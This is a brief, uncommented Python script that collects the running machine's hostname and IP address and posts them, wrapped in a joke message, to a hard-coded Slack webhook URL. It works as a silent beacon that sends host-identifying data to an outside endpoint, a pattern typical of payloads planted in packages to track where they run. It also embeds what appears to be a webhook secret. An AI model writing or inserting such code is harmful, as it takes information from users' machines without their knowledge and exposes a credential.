import requests
import socket
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

r = requests.post('https://hooks.slack.com/services/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', json={"text": f"I like spaghetti with ketchup: {hostname}/{IPAddr}"})
